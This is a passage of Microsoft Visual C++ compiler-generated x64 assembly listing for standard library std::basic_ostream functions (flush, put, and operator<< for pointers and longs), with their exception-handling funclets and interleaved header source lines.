	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::flush'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$1 = 32
tv78 = 36
_Rdbuf$ = 40
_Ok$2 = 48
this$ = 80
?catch$1@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::flush'::`1'::catch$1

; 566  :                 _CATCH_IO_END

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ$0:
	mov	rax, QWORD PTR this$[rbp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8b, 1
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
	npad	1
	lea	rax, $LN11@catch$1
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$1@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::flush'::`1'::catch$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z
_TEXT	SEGMENT
_State$ = 32
tv156 = 36
$T1 = 40
$T2 = 44
tv65 = 48
$T3 = 56
_Ok$ = 64
this$ = 96
_Ch$ = 104
?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::put, COMDAT

; 518  :     basic_ostream& __CLR_OR_THIS_CALL put(_Elem _Ch) { // insert a character

$LN13:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 519  :         ios_base::iostate _State = ios_base::goodbit;

	mov	DWORD PTR _State$[rsp], 0

; 520  :         const sentry _Ok(*this);

	mov	rdx, QWORD PTR this$[rsp]
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
	npad	1

; 521  : 
; 522  :         if (!_Ok) {

	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN2@put

; 523  :             _State |= ios_base::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 524  :         } else { // state okay, insert character

	jmp	SHORT $LN3@put
$LN2@put:

; 525  :             _TRY_IO_BEGIN
; 526  :             if (_Traits::eq_int_type(_Traits::eof(), _Myios::rdbuf()->sputc(_Ch))) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR tv65[rsp], rax
	movzx	edx, BYTE PTR _Ch$[rsp]
	mov	rcx, QWORD PTR tv65[rsp]
	call	?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
	mov	DWORD PTR tv156[rsp], eax
	mov	eax, DWORD PTR tv156[rsp]
	mov	DWORD PTR $T1[rsp], eax
	call	?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ; std::_Narrow_char_traits<char,int>::eof
	mov	DWORD PTR $T2[rsp], eax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN5@put

; 527  :                 _State |= ios_base::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax
$LN5@put:
	jmp	SHORT $LN3@put
$LN11@put:
$LN3@put:

; 528  :             }
; 529  :             _CATCH_IO_END
; 530  :         }
; 531  : 
; 532  :         _Myios::setstate(_State);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, DWORD PTR _State$[rsp]
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate

; 533  :         return *this;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR $T3[rsp], rax
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
	mov	rax, QWORD PTR $T3[rsp]

; 534  :     }

	add	rsp, 88					; 00000058H
	ret	0
?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::put
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv156 = 36
$T1 = 40
$T2 = 44
tv65 = 48
$T3 = 56
_Ok$ = 64
this$ = 96
_Ch$ = 104
?dtor$0@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::put'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Ok$[rbp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::put'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv156 = 36
$T1 = 40
$T2 = 44
tv65 = 48
$T3 = 56
_Ok$ = 64
this$ = 96
_Ch$ = 104
?catch$1@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::put'::`1'::catch$1

; 529  :             _CATCH_IO_END

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z$0:
	mov	rax, QWORD PTR this$[rbp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8b, 1
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
	npad	1
	lea	rax, $LN11@catch$1
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$1@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::put'::`1'::catch$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z
_TEXT	SEGMENT
tv201 = 48
_State$ = 52
tv65 = 56
tv198 = 64
tv202 = 72
_Nput_fac$1 = 80
tv203 = 88
$T2 = 96
_Ok$ = 104
$T3 = 120
$T4 = 144
$T5 = 160
$T6 = 176
this$ = 224
_Val$ = 232
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::operator<<, COMDAT

; 443  :     basic_ostream& __CLR_OR_THIS_CALL operator<<(const void* _Val) { // insert a void pointer

$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 200				; 000000c8H

; 444  :         ios_base::iostate _State = ios_base::goodbit;

	mov	DWORD PTR _State$[rsp], 0

; 445  :         const sentry _Ok(*this);

	mov	rdx, QWORD PTR this$[rsp]
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
	npad	1

; 446  : 
; 447  :         if (_Ok) { // state okay, use facet to insert

	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
	movzx	eax, al
	test	eax, eax
	je	$LN2@operator

; 448  :             const _Nput& _Nput_fac = _STD use_facet<_Nput>(this->getloc());

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T3[rsp]
	mov	rcx, rax
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv65[rsp], rax
	mov	rax, QWORD PTR tv65[rsp]
	mov	QWORD PTR tv198[rsp], rax
	mov	rcx, QWORD PTR tv198[rsp]
	call	??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z ; std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >
	mov	QWORD PTR _Nput_fac$1[rsp], rax
	lea	rcx, QWORD PTR $T3[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	npad	1

; 449  : 
; 450  :             _TRY_IO_BEGIN
; 451  :             if (_Nput_fac.put(_Iter(_Myios::rdbuf()), *this, _Myios::fill(), _Val).failed()) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADXZ ; std::basic_ios<char,std::char_traits<char> >::fill
	mov	BYTE PTR tv201[rsp], al
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR tv202[rsp], rax
	mov	rdx, QWORD PTR tv202[rsp]
	lea	rcx, QWORD PTR $T5[rsp]
	call	??0?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z ; std::ostreambuf_iterator<char,std::char_traits<char> >::ostreambuf_iterator<char,std::char_traits<char> >
	lea	rcx, QWORD PTR $T4[rsp]
	mov	rdi, rcx
	mov	rsi, rax
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Val$[rsp]
	mov	QWORD PTR [rsp+40], rcx
	movzx	ecx, BYTE PTR tv201[rsp]
	mov	BYTE PTR [rsp+32], cl
	mov	r9, rax
	lea	r8, QWORD PTR $T4[rsp]
	lea	rdx, QWORD PTR $T6[rsp]
	mov	rcx, QWORD PTR _Nput_fac$1[rsp]
	call	?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::put
	mov	QWORD PTR tv203[rsp], rax
	mov	rcx, QWORD PTR tv203[rsp]
	call	?failed@?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::failed
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN4@operator

; 452  :                 _State |= ios_base::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax
$LN4@operator:
	jmp	SHORT $LN2@operator
$LN11@operator:
$LN2@operator:

; 453  :             }
; 454  :             _CATCH_IO_END
; 455  :         }
; 456  : 
; 457  :         _Myios::setstate(_State);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, DWORD PTR _State$[rsp]
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate

; 458  :         return *this;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR $T2[rsp], rax
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
	mov	rax, QWORD PTR $T2[rsp]

; 459  :     }

	add	rsp, 200				; 000000c8H
	pop	rdi
	pop	rsi
	ret	0
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::operator<<
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv201 = 48
_State$ = 52
tv65 = 56
tv198 = 64
tv202 = 72
_Nput_fac$1 = 80
tv203 = 88
$T2 = 96
_Ok$ = 104
$T3 = 120
$T4 = 144
$T5 = 160
$T6 = 176
this$ = 224
_Val$ = 232
?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Ok$[rbp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv201 = 48
_State$ = 52
tv65 = 56
tv198 = 64
tv202 = 72
_Nput_fac$1 = 80
tv203 = 88
$T2 = 96
_Ok$ = 104
$T3 = 120
$T4 = 144
$T5 = 160
$T6 = 176
this$ = 224
_Val$ = 232
?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T3[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv201 = 48
_State$ = 52
tv65 = 56
tv198 = 64
tv202 = 72
_Nput_fac$1 = 80
tv203 = 88
$T2 = 96
_Ok$ = 104
$T3 = 120
$T4 = 144
$T5 = 160
$T6 = 176
this$ = 224
_Val$ = 232
?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::catch$2

; 454  :             _CATCH_IO_END

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 48					; 00000030H
	mov	rbp, rdx
__catch$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z$0:
	mov	rax, QWORD PTR this$[rbp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8b, 1
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
	npad	1
	lea	rax, $LN11@catch$2
	add	rsp, 48					; 00000030H
	pop	rbp
	ret	0
	int	3
?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::catch$2
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z
_TEXT	SEGMENT
tv201 = 48
_State$ = 52
tv65 = 56
tv198 = 64
tv202 = 72
_Nput_fac$1 = 80
tv203 = 88
$T2 = 96
_Ok$ = 104
$T3 = 120
$T4 = 144
$T5 = 160
$T6 = 176
this$ = 224
_Val$ = 232
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::operator<<, COMDAT

; 317  :     basic_ostream& __CLR_OR_THIS_CALL operator<<(long _Val) { // insert a long

$LN13:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 200				; 000000c8H

; 318  :         ios_base::iostate _State = ios_base::goodbit;

	mov	DWORD PTR _State$[rsp], 0

; 319  :         const sentry _Ok(*this);

	mov	rdx, QWORD PTR this$[rsp]
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
	npad	1

; 320  : 
; 321  :         if (_Ok) { // state okay, use facet to insert

	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
	movzx	eax, al
	test	eax, eax
	je	$LN2@operator

; 322  :             const _Nput& _Nput_fac = _STD use_facet<_Nput>(this->getloc());

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T3[rsp]
	mov	rcx, rax
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv65[rsp], rax
	mov	rax, QWORD PTR tv65[rsp]
	mov	QWORD PTR tv198[rsp], rax
	mov	rcx, QWORD PTR tv198[rsp]
	call	??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z ; std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >
	mov	QWORD PTR _Nput_fac$1[rsp], rax
	lea	rcx, QWORD PTR $T3[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	npad	1

; 323  : 
; 324  :             _TRY_IO_BEGIN
; 325  :             if (_Nput_fac.put(_Iter(_Myios::rdbuf()), *this, _Myios::fill(), _Val).failed()) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADXZ ; std::basic_ios<char,std::char_traits<char> >::fill
	mov	BYTE PTR tv201[rsp], al
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR tv202[rsp], rax
	mov	rdx, QWORD PTR tv202[rsp]
	lea	rcx, QWORD PTR $T5[rsp]
	call	??0?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z ; std::ostreambuf_iterator<char,std::char_traits<char> >::ostreambuf_iterator<char,std::char_traits<char> >
	lea	rcx, QWORD PTR $T4[rsp]
	mov	rdi, rcx
	mov	rsi, rax
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	ecx, DWORD PTR _Val$[rsp]
	mov	DWORD PTR [rsp+40], ecx
	movzx	ecx, BYTE PTR tv201[rsp]
	mov	BYTE PTR [rsp+32], cl
	mov	r9, rax
	lea	r8, QWORD PTR $T4[rsp]
	lea	rdx, QWORD PTR $T6[rsp]
	mov	rcx, QWORD PTR _Nput_fac$1[rsp]
	call	?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::put
	mov	QWORD PTR tv203[rsp], rax
	mov	rcx, QWORD PTR tv203[rsp]
	call	?failed@?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::failed
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN4@operator

; 326  :                 _State |= ios_base::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax
$LN4@operator:
	jmp	SHORT $LN2@operator
$LN11@operator:
$LN2@operator:

; 327  :             }
; 328  :             _CATCH_IO_END
; 329  :         }
; 330  : 
; 331  :         _Myios::setstate(_State);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, DWORD PTR _State$[rsp]
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate

; 332  :         return *this;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR $T2[rsp], rax
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
	mov	rax, QWORD PTR $T2[rsp]

; 333  :     }

	add	rsp, 200				; 000000c8H
	pop	rdi
	pop	rsi
	ret	0
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::operator<<
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv201 = 48
_State$ = 52
tv65 = 56
tv198 = 64
tv202 = 72
_Nput_fac$1 = 80
tv203 = 88
$T2 = 96
_Ok$ = 104
$T3 = 120
$T4 = 144
$T5 = 160
$T6 = 176
this$ = 224
_Val$ = 232
?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Ok$[rbp]
	call	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv201 = 48
_State$ = 52
tv65 = 56
tv198 = 64
tv202 = 72
_Nput_fac$1 = 80
tv203 = 88
$T2 = 96
_Ok$ = 104
$T3 = 120
$T4 = 144
$T5 = 160
$T6 = 176
this$ = 224
_Val$ = 232
?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T3[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv201 = 48
_State$ = 52
tv65 = 56
tv198 = 64
tv202 = 72
_Nput_fac$1 = 80
tv203 = 88
$T2 = 96
_Ok$ = 104
$T3 = 120
$T4 = 144
$T5 = 160
$T6 = 176
this$ = 224
_Val$ = 232
?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::catch$2

; 328  :             _CATCH_IO_END

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 48					; 00000030H
	mov	rbp, rdx
__catch$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z$0:
	mov	rax, QWORD PTR this$[rbp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8b, 1
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
	npad	1
	lea	rax, $LN11@catch$2
	add	rsp, 48					; 00000030H
	pop	rbp
	ret	0
	int	3
?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::operator<<'::`1'::catch$2
text$x	ENDS
